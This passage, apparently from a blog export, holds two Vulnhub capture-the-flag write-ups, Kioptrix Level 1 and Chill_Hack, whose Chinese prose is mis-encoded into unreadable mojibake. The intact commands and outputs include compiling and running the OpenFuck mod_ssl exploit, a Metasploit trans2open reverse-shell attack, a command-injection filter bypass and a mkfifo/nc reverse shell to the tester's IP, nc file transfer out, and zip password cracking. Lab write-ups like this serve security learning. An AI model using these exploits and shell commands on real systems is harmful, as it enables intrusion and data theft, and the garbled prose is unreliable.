Vulnhub","url":"/2021/11/13/Vulnhub/Vulnhub -Kioptrix/","content":"\n## é¶åœºä¿¡æ¯\n\n```\nThis Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.\nè¿™ä¸ªKioptrix VM Imageæ˜¯å¾ˆå®¹æ˜“çš„æŒ‘æˆ˜ã€‚æ¸¸æˆçš„ç›®çš„æ˜¯é€šè¿‡ä»»ä½•å¯èƒ½çš„æ‰‹æ®µè·å¾—rootæƒé™ï¼ˆé™¤äº†å®é™…å…¥ä¾µVMæœåŠ¡å™¨æˆ–ç©å®¶ï¼‰ã€‚è¿™äº›æ¸¸æˆçš„ç›®çš„æ˜¯å­¦ä¹ æ¼æ´è¯„ä¼°å’Œåˆ©ç”¨æ–¹é¢çš„åŸºæœ¬å·¥å…·å’ŒæŠ€æœ¯ã€‚æˆåŠŸå®Œæˆè¿™äº›æŒ‘æˆ˜çš„æ–¹æ³•æœ‰å¾ˆå¤šã€‚\n```\n\n```\nä¸‹è½½åœ°å€\nhttps://www.vulnhub.com/entry/kioptrix-level-1-1,22/\n```\n\n## ä¿¡æ¯æœé›†\n\né¦–å…ˆä½¿ç”¨arpè·å–é¶æœºçš„IPåœ°å€\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106\nStarting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.1.102   00:0c:29:55:cb:15       VMware, Inc.\n\n9 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded\n```\n\nç¡®å®šé¶æœºIPåœ°å€ä¸º192.168.1.102ï¼Œä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 EST\nNmap scan report for 192.168.1.102\nHost is up (0.00042s latency).\nNot shown: 65529 closed ports\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| ssh-hostkey:\n|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)\n|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)\n|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)\n|_sshv1: Server supports SSHv1\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-title: Test Page for the Apache Web Server on Red Hat Linux\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-title: 400 Bad Request\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2009-09-26T09:32:06\n|_Not valid after:  2010-09-26T09:32:06\n|_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time.\n| sslv2:\n|   SSLv2 supported\n|   ciphers:\n|     SSL2_RC2_128_CBC_WITH_MD5\n|     SSL2_RC4_128_WITH_MD5\n|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n|     SSL2_RC4_64_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|     SSL2_DES_192_EDE3_CBC_WITH_MD5\n|_    SSL2_DES_64_CBC_WITH_MD5\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:55:CB:15 (VMware)\nDevice type: general purpose\nRunning: Linux 2.4.X\nOS CPE: cpe:/o:linux:linux_kernel:2.4\nOS details: Linux 2.4.9 - 2.4.18 (likely embedded)\nNetwork Distance: 1 hop\n\nHost script results:\n|_clock-skew: 1h01m54s\n|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.42 ms 192.168.1.102\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 69.83 seconds\n```\n\nè¿™ä¸œè¥¿ç¨å¾®çš„æœ‰ç‚¹å¤šï¼Œä¸€ä¸ªä¸ªçœ‹\n\n![](Vulnhub-Kioptrix/image1.png)\n\n80ç«¯å£å¥½åƒä¹Ÿæ²¡å•¥å¯çœ‹çš„ï¼Ÿæ‰«ä¸ªç›®å½•çœ‹çœ‹å§\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.1.102/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/dirb/wordlists/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/11/12 07:52:42 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://192.168.1.102/.htaccess            (Status: 403) [Size: 273]\nhttp://192.168.1.102/.htpasswd            (Status: 403) [Size: 273]\nhttp://192.168.1.102/.hta                 (Status: 403) [Size: 268]\nhttp://192.168.1.102/.htaccess.php        (Status: 403) [Size: 277]\nhttp://192.168.1.102/.htpasswd.php        (Status: 403) [Size: 277]\nhttp://192.168.1.102/.hta.php             (Status: 403) [Size: 272]\nhttp://192.168.1.102/~root                (Status: 403) [Size: 269]\nhttp://192.168.1.102/~operator            (Status: 403) [Size: 273]\nhttp://192.168.1.102/cgi-bin/             (Status: 403) [Size: 272]\nhttp://192.168.1.102/index.html           (Status: 200) [Size: 2890]\nhttp://192.168.1.102/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]\nhttp://192.168.1.102/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]\nhttp://192.168.1.102/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]\nhttp://192.168.1.102/test.php             (Status: 200) [Size: 27]\n```\n\næŒ¨ä¸ªå»çœ‹çœ‹\n\n![](Vulnhub-Kioptrix/image2.png)\n\nå‡ ä¸ªé¡µé¢éƒ½ä¼šè·³è½¬åˆ°127.0.0.1ï¼Œåªæœ‰test.phpå¯ä»¥è®¿é—®ï¼Œè€Œä¸”è¿˜æ²¡ä»€ä¹ˆä¸œè¥¿\n\nç»§ç»­å›åˆ°ç«¯å£çœ‹çœ‹å§\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# smbclient -L 192.168.1.102                                                                                                            1 â¨¯\nprotocol negotiation failed: NT_STATUS_IO_TIMEOUT\n```\n\n## æ¼æ´åˆ©ç”¨\n\nçœ‹åˆ°80ç«¯å£åé¢çš„mod_ssl/2.8.4ï¼Œå»æœä¸€ä¸‹æœ‰æ²¡æœ‰Exploit\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit mod_ssl\n------------------------------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                                              |  Path\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nApache mod_ssl 2.0.x - Remote Denial of Service                                                             | linux/dos/24590.txt\nApache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                  | multiple/dos/21575.txt\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                        | unix/remote/21671.c\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                  | unix/remote/764.c\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                  | unix/remote/47080.c\nApache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow                | unix/remote/40347.txt\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results\n```\n\nå¯¹æ¯”mod_ssl/2.8.4ç‰ˆæœ¬ï¼Œæœ‰ä¸‰ä¸ªç‰ˆæœ¬åˆé€‚ï¼ŒæŒ¨ä¸ªè¿›è¡Œæµ‹è¯•\n\nç»è¿‡æµ‹è¯•å‘ç°unix/remote/47080.cæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå’±ä»¬ç»™ä»–å¤åˆ¶å‡ºæ¥\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# locate unix/remote/47080.c\n/usr/share/exploitdb/exploits/unix/remote/47080.c\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./\n```\n\nç„¶åä½¿ç”¨gccè¿›è¡Œç¼–è¯‘\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gcc -o exploit 47080.c -lcrypto\n47080.c:21:10: fatal error: openssl/ssl.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•\n   21 | #include <openssl/ssl.h>\n      |          ^~~~~~~~~~~~~~~\ncompilation terminated.\n```\n\næç¤ºæŠ¥é”™äº†ï¼Œç»è¿‡ç™¾åº¦æœç´¢ï¼Œå‘ç°æ˜¯ç¼ºå°‘äº†ç»„ä»¶\n\nå’±ä»¬ä½¿ç”¨aptè¿›è¡Œå®‰è£…\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# apt-get install libssl1.0-dev\n```\n\nç„¶åå†è¿›è¡Œç¼–è¯‘\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gcc -o exploit 47080.c -lcrypto\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ls\n47080.c  exploit\n```\n\nå»è¿è¡Œä¸€ä¸‹\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ./exploit\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\n: Usage: ./exploit target box [port] [-c N]\n\n  target - supported box eg: 0x00\n  box - hostname or IP address\n  port - port for ssl connection\n  -c open N connections. (use range 40-50 if u dont know)\n```\n\nè¿è¡Œåå¾—åˆ°äº†è¿è¡Œå‚æ•°ï¼Œå’±ä»¬è¿˜å¾—å…ˆæ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ./exploit | grep apache-1.3.20                                                                                                        1 â¨¯\n        0x02 - Cobalt Sun 6.0 (apache-1.3.20)\n        0x27 - FreeBSD (apache-1.3.20)\n        0x28 - FreeBSD (apache-1.3.20)\n        0x29 - FreeBSD (apache-1.3.20+2.8.4)\n        0x2a - FreeBSD (apache-1.3.20_1)\n        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)\n        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)\n        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)\n        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1\n        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2\n        0x7e - Slackware Linux 8.0 (apache-1.3.20)\n        0x86 - SuSE Linux 7.3 (apache-1.3.20)\n```\n\nç¬¦åˆæ¡ä»¶çš„æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯0x6aå’Œ0x6bï¼Œåˆ†åˆ«å»æµ‹è¯•ä¸€ä¸‹\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ./exploit 0x6a 192.168.1.102 -c 40\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nConnection... 40 of 40\nEstablishing SSL connection\ncipher: 0x4043808c   ciphers: 0x80f8070\nReady to send shellcode\nSpawning shell...\nGood Bye!\n```\n\n0x6aæµ‹è¯•å¤±è´¥ï¼Œç°åœ¨å»æµ‹è¯•ä¸€ä¸‹0x6b\n\n```\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ./exploit 0x6b 192.168.1.102 -c 40\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nConnection... 40 of 40\nEstablishing SSL connection\ncipher: 0x4043808c   ciphers: 0x80f81e8\nReady to send shellcode\nSpawning shell...\nbash: no job control in this shell\nbash-2.05$\nd.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo\n--09:32:52--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c\n           => `ptrace-kmod.c'\nConnecting to dl.packetstormsecurity.net:443... connected!\n\nUnable to establish SSL connection.\n\nUnable to establish SSL connection.\ngcc: ptrace-kmod.c: No such file or directory\ngcc: No input files\nrm: cannot remove `ptrace-kmod.c': No such file or directory\nbash: ./exploit: No such file or directory\nbash-2.05$\nbash-2.05$ whoami&&id\nwhoami&&id\napache\nuid=48(apache) gid=48(apache) groups=48(apache)\n```\n\n0x6bæˆåŠŸgetshellï¼Œç°åœ¨å»ææƒ\n\n## æƒé™æå‡\n\nç»è¿‡æµ‹è¯•åæ²¡æœ‰å‘ç°ææƒçš„ç‚¹ï¼Œä½†æ˜¯å‘ç°äº†å¦ä¸€ç§rootæƒé™çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯ç”¨msfçš„æ¨¡å—\n\n```\nuse exploit/linux/samba/trans2open\nset payload linux/x86/shell_reverse_tcp\nshow options\nset rhosts 192.168.1.102\nexploit\n\nmsf6 exploit(linux/samba/trans2open) > exploit\n\n[*] Started reverse TCP handler on 192.168.1.106:4444\n[*] 192.168.1.102:139 - Trying return address 0xbffffdfc...\n[*] 192.168.1.102:139 - Trying return address 0xbffffcfc...\n[*] 192.168.1.102:139 - Trying return address 0xbffffbfc...\n[*] 192.168.1.102:139 - Trying return address 0xbffffafc...\n[*] 192.168.1.102:139 - Trying return address 0xbffff9fc...\n[*] 192.168.1.102:139 - Trying return address 0xbffff8fc...\n[*] Command shell session 1 opened (192.168.1.106:4444 -> 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500\n\n[*] Command shell session 2 opened (192.168.1.106:4444 -> 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500\n[*] Command shell session 3 opened (192.168.1.106:4444 -> 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=99(nobody)\n```\n\nç”¨msfçš„æ¨¡å—æ‰“å°±æ˜¯rootï¼Œè‡³äºä¸ºå•¥æˆ‘ä¹Ÿæ²¡ç ”ç©¶å‡ºä¸ªæ‰€ä»¥ç„¶æ¥ï¼ˆä¸»è¦å› ä¸ºèœï¼‰\n\nçŸ¥é“åŸå› çš„å°ä¼™ä¼´å¯ä»¥å‘Šè¯‰æˆ‘ä¸€ä¸‹\n","tags":["Vulnhub"]},{"title":"Chill_Hack - Vulnhub","url":"/2021/10/17/Vulnhub/Vulnhub -Chill_Hack/","content":"\n# Vulnhub-Chill_Hack\n\né¶åœºå®æˆ˜ Vulnhub-Chill_Hack\n\né¶åœºä¸‹è½½åœ°å€https://www.vulnhub.com/entry/chill-hack-1,622/\n\nåºŸè¯ä¸å¤šè¯´ ç›´æ¥å¼€å§‹\n\nç¬¬ä¸€æ­¥ä½¿ç”¨kaliæ‰«æå†…ç½‘IP\n\nArp-scan â€“l\n\n![](Vulnhub-Chill_Hack/image1.png)\n\nè·å¾—é¶åœºIPä¸º192.168.72.132\n\nå¯¹é¶åœºè¿›è¡Œç«¯å£æ‰«æ\n\nNmap â€“A â€“v 192.168.72.132\n\n![](Vulnhub-Chill_Hack/image2.png)\n\nå‘ç°å­˜åœ¨21 22 80ä¸‰ä¸ªç«¯å£\n\n21ç«¯å£å­˜åœ¨åŒ¿åè®¿é—® å’±ä»¬å…ˆè®¿é—®çœ‹çœ‹\n\nç”¨æˆ·åä½¿ç”¨anonymous å¯†ç ä¸ºç©º\n\n![](Vulnhub-Chill_Hack/image3.png)\n\næˆåŠŸç™»é™†\n\næŸ¥çœ‹æœ‰ä»€ä¹ˆæ–‡ä»¶\n\n![](Vulnhub-Chill_Hack/image4.png)\n\nå‘ç°å­˜åœ¨ä¸€ä¸ªtxtæ–‡ä»¶ æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹\n\nä½¿ç”¨getä¸‹è½½åˆ°æœ¬åœ°ç„¶åæ‰“å¼€æŸ¥çœ‹\n\n![](Vulnhub-Chill_Hack/image5.png)\n\n![](Vulnhub-Chill_Hack/image6.png)\n\nå—¯â€¦å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆç”¨\n\næˆ‘ä»¬è¿˜æ˜¯å…ˆçœ‹çœ‹80ç«¯å£çš„WebæœåŠ¡å§\n\n![](Vulnhub-Chill_Hack/image7.png)\n\nçœ‹ä¸Šå»åƒæ˜¯ä¸€ä¸ªä½“è‚²æ¯”èµ›çš„å®˜ç½‘ï¼Ÿ\n\næ‰«æä¸€ä¸‹ç›®å½•\n\n![](Vulnhub-Chill_Hack/image8.png)\n\nå‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„URL [http://192.168.72.132/secret/index.php](http://192.168.72.132/secret/index.php)\n\nå¯ä»¥æ‰§è¡Œå‘½ä»¤\n\n![](Vulnhub-Chill_Hack/image9.png)\n\nOK çªç ´å£åº”è¯¥å°±åœ¨è¿™é‡Œäº†\n\nå½“æˆ‘è¾“å…¥lsæƒ³æŸ¥çœ‹ä¸€ä¸‹å½“å‰ç›®å½•æ–‡ä»¶çš„æ—¶å€™\n\n![](Vulnhub-Chill_Hack/image10.png)\n\nè¿™æ—¶æˆ‘æƒ³èµ·æ¥æˆ‘ä»¬é‚£ä¸ªnote.txtæ–‡ä»¶é‡Œçš„è¯æ˜¯ä»€ä¹ˆæ„æ€\n\nè¯æ˜è¿™é‡Œæœ‰è¿‡æ»¤ å°±æ˜¯ä¸çŸ¥é“æ˜¯ç™½åå•è¿˜æ˜¯é»‘åå•äº†\n\nç»è¿‡æˆ‘å¤§é‡æµ‹è¯• è¯¥é¶åœºä¸ºé»‘åå•éªŒè¯\n\né‚£å°±å¥½åŠäº† ç»•è¿‡å§\n\nå‡ºå»åƒäº†ä¸ªé¥­ å›æ¥çªç„¶æ¥äº†æ€è·¯\n\nå°†ä¸¤ä¸ªæŒ‡ä»¤ç»“åˆèµ·æ¥ ä¸å°±æˆäº†å—\n\nä¾‹å¦‚ lsä¼šè¢«æ‹¦æˆª\n\né‚£å°± whoami;ls\n\n![](Vulnhub-Chill_Hack/image11.png)\n\næˆåŠŸæ‰§è¡Œ æˆ‘å¯çœŸæ˜¯ä¸ªå°æœºçµ\n\nå°†è¯¥æ–¹æ³•å’ŒNCåå¼¹ä¸€ç»“åˆ ä¸å°±æ‹¿åˆ°shelläº†ï¼Ÿ\n\nç»è¿‡å¤§é‡æµ‹è¯• å‘ç°å¯ç”¨çš„åå¼¹è¯­å¥ä¸º\n\ndir;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1|nc 192.168.72.130 7777 > /tmp/f\n\næœ¬æœºç›‘å¬ nc â€“lvp 7777\n\næ‰§è¡Œ æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshell\n\n![](Vulnhub-Chill_Hack/image12.png)\n\n![](Vulnhub-Chill_Hack/image13.png)\n\nè¯¥shellæƒé™è¿˜æ˜¯è¾ƒä½ å¹¶ä¸”æ“ä½œéå¸¸ä¸ä¾¿åˆ© å’±ä»¬è¦æƒ³åŠæ³•ææƒ\n\næŸ¥æ‰¾pythonç‰ˆæœ¬\n\nWhich python\n\n![](Vulnhub-Chill_Hack/image14.png)\n\næˆåŠŸç¡®è®¤pythonç‰ˆæœ¬ä¸ºpython3\n\nä½¿ç”¨python3å°†shellè¿›è¡Œæå‡\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n![](Vulnhub-Chill_Hack/image15.png)\n\næˆåŠŸ\n\nè¯¥å‘½ä»¤ä¸ä¼šå¯¹ç”µè„‘æœ‰ä»€ä¹ˆå±å®³ ä½†å¶å°”ä¼šæœ‰å¥‡æ•ˆ\n\n![](Vulnhub-Chill_Hack/image16.png)\n\nåœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹ è¿™ä¸ªhacker.phpå¼•èµ·äº†æˆ‘çš„æ³¨æ„ æŸ¥çœ‹ä¸€ä¸‹å§\n\n![](Vulnhub-Chill_Hack/image17.png)\n\nåœ¨é»‘æš—ä¸­æˆ‘ä¼šçœ‹åˆ°ç­”æ¡ˆï¼ŸçœŸå°±äººå‡è°œè¯­äººå‘—\n\nåœ¨hacker.phpä¸­ æˆ‘ä»¬çœ‹åˆ°imagesæ–‡ä»¶å¤¹ä¸­æœ‰ä¸€å¼ å›¾ç‰‡ åº”è¯¥å°±æ˜¯çº¿ç´¢æ‰€åœ¨\n\nå’±ä»¬è¿›å…¥imagesæ–‡ä»¶å¤¹\n\n![](Vulnhub-Chill_Hack/image18.png)\n\nOK å’±ä»¬æŠŠè¿™å¼ å›¾ç‰‡ç”¨ncä¸‹è½½ä¸‹æ¥ ä¹Ÿå¯ä»¥ç”¨python3å¼€å¯httpæœåŠ¡è¿›è¡Œä¸‹è½½ ä¸è¿‡æˆ‘å›¾çœäº‹å„¿ å°±ncäº†å§\n\næœ¬åœ°ç”µè„‘è¿è¡Œ nc â€“nvlp 4444 > hacker-with-laptop_23-2147985341.jpg\n\nå’±ä»¬ä¿æŒåŸåä¸åŠ¨\n\nShellé‡Œè¿è¡Œ nc 192.168.72.130 4444 -w 4 < hacker-with-laptop_23-2147985341.jpg\n\n![](Vulnhub-Chill_Hack/image19.png)\n\nOK ç¨ç­‰ä¸€ä¼šå„¿ æˆåŠŸä¸‹è½½ä¸‹æ¥\n\næ ¹æ®hacker.phpä¸­çš„æç¤º åœ¨é»‘æš—ä¸­æˆ‘ä»¬ä¼šçœ‹åˆ°ç­”æ¡ˆ è¿™ä¸å°±æ˜¯å¦¥å¦¥çš„å›¾ç‰‡éšå†™å— ä¸æ„§æ˜¯æˆ‘ æœ€è¿‘çš„æŸ¯å—æ²¡ç™½çœ‹\n\nä½¿ç”¨steghideæŸ¥çœ‹\n\n![](Vulnhub-Chill_Hack/image20.png)\n\næœç„¶å­˜åœ¨ä¸€ä¸ªåä¸ºbackup.zipçš„å‹ç¼©åŒ… ä¸æ„§æ˜¯æˆ‘\n\nä¾ç„¶ä½¿ç”¨steghideè¿›è¡Œè§£å‹\n\n![](Vulnhub-Chill_Hack/image21.png)\n\nOK å¾—åˆ°äº†è¿™ä¸ªåä¸ºbackup.zipçš„å‹ç¼©åŒ…æ–‡ä»¶\n\næˆ‘ä»¬ç°åœ¨å°†ä»–è§£å‹ç¼©\n\n![](Vulnhub-Chill_Hack/image22.png)\n\næˆ‘ä¸¢å•Š è¿™é‡Œæ¥ä¸ªå¯†ç  æˆå§ å†æ‰¾\n\næ‰¾ï¼Ÿæ‰¾æ˜¯ä¸å¯èƒ½æ‰¾çš„ å°±å’±è¿™æš´è„¾æ°” çˆ†ä»–ï¼\n\n![](Vulnhub-Chill_Hack/image23.png)\n\nä½¿ç”¨zip2johbç”Ÿæˆäº†ä¸€ä¸ªbackup.johnæ–‡ä»¶\n\nå’±ä»¬ä½¿ç”¨johnçˆ†ä»–\n\n![](Vulnhub-Chill_Hack/image24.png)\n\nOK å®Œæˆ\n\nå’±ä»¬ä½¿ç”¨johnæŸ¥çœ‹å¯†ç \n\n![](Vulnhub-Chill_Hack/image25.png)\n\nå¯†ç ä¸ºpass1word è¡Œå§ ç»å…¸å¼±å£ä»¤\n\næ¥ä¸‹æ¥å’±ä»¬è§£å‹æ–‡ä»¶\n\n![](Vulnhub-Chill_Hack/image26.png)\n\næˆåŠŸè§£å‹å‡ºæ¥\n\næŸ¥çœ‹è§£å‹å‡ºæ¥çš„æ–‡ä»¶\n\n![](Vulnhub-Chill_Hack/image27.png)\n\nå¥½å®¶ä¼™ è¿˜æœ‰ä¸ªbase64ç¼–ç  è§£å¯†å§\n\n![](Vulnhub-Chill_Hack/image28.png)\n\nè¿”å›æˆ‘ä»¬çš„shell æŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ·\n\n![](Vulnhub-Chill_Hack/image29.png)\n\nä½¿ç”¨æˆ‘ä»¬å¾—åˆ°çš„å¯†ç ç™»å…¥è¿›ç”¨æˆ·anurodh\n\n![](Vulnhub-Chill_Hack/image30.png)\n\næˆåŠŸç™»å…¥\n\nç¡®è®¤è´¦æˆ·å¯†ç æ²¡é—®é¢˜äº† è¿™æ—¶å€™å’±ä»¬å°±è¦ç”¨åˆ°ä¸€å¼€å§‹æ‰«æå‡ºçš„22ç«¯å£äº†\n\næ¯•ç«Ÿshellæ˜¯ä¸ç¨³å®šçš„ ä½¿ç”¨sshæœåŠ¡ç™»å…¥å§\n\n![](Vulnhub-Chill_Hack/image31.png)\n\næˆåŠŸç™»å…¥ æœ‰ä¸€ä¸ªç¨³å®šçš„æƒé™çš„æ„Ÿè§‰å¤ªçˆ½äº†\n\nè¿™æ—¶å€™è‚¯å®šå°±æ˜¯ææƒäº†æ˜¯å§\n\nç›´æ¥ä½¿ç”¨ç»å…¸çš„sudo su\n\n![](Vulnhub-Chill_Hack/image32.png)\n\nå¤±è´¥äº† å—¯â€¦ æƒ…ç†ä¹‹ä¸­ æ„æ–™ä¹‹å¤–\n\nä½¿ç”¨sudo â€“læŸ¥çœ‹sudoçš„æƒé™ å‘ç°apaarå¯ä»¥ææƒï¼Ÿé‚£å°±é€ ä»–\n\n![](Vulnhub-Chill_Hack/image33.png)\n\næŸ¥çœ‹apaaræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶\n\n![](Vulnhub-Chill_Hack/image34.png)\n\nå‘ç°apaarä¸‹æœ‰ä¸ªtxtæ–‡ä»¶ ä½†ç”±äºæƒé™æ–‡ä»¶æˆ‘ä»¬æ— æ³•è®¿é—®\n\nä½†ä¸Šè¿°æåˆ°äº† apaarä¸‹æœ‰ä¸ªshè„šæœ¬æˆ‘ä»¬å¯ä»¥æ‰§è¡Œ é‚£å°±æ‰§è¡Œå®ƒ\n\n![](Vulnhub-Chill_Hack/image35.png)\n\nå®ƒéœ€è¦ä¸€ä¸ªåå­— å’±ä»¬éšä¾¿è¾“å…¥å³å¯\n\n![](Vulnhub-Chill_Hack/image36.png)\n\næ‰§è¡Œå®Œæ¯•äº† ä½†æˆ‘ä¸çŸ¥é“å®ƒæœ‰æ•ˆæœ\n\né‚£å°±é˜…è¯»ä¸€ä¸‹å§\n\n![](Vulnhub-Chill_Hack/image37.png)\n\nè¿™ä¸ªæ‰¹å¤„ç† æœ‰ç‚¹æ„æ€å•Š ä¼¼ä¹å¯ä»¥å‘½ä»¤æ‰§è¡Œ\n\n![](Vulnhub-Chill_Hack/image38.png)\n\nå°è¯•æˆåŠŸ 